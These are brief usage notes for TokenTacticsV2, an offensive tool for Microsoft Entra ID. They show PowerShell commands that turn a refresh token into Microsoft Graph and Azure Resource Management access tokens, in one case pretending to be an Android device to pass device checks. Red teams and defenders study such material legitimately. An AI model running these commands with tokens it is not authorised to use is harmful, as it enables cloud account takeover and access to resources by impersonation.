# TokenTacticsV2 

## Link: https://github.com/f-bader/TokenTacticsV2

### Usage:

#### 1) Create an access token for Microsoft Graph from our refresh token.

    Invoke-RefreshToMSGraphToken -domain DOMAIN.CORP -refreshToken "REFRESH_TOKEN" 
 
    $MSGraphToken.access_token (This is the generated access token from the previous command)

#### 2) Specify the device and so we can again pretend to be an Android device, and successfully get an access token for the Azure Resource Management ARM API

    Invoke-RefreshToAzureManagementToken -Domain DOMAIN.CORP -RefreshToken $refreshtoken -Device AndroidMobile -Browser Android 

    $AzureManagementToken.access_token (The ARM access token from the previous command)

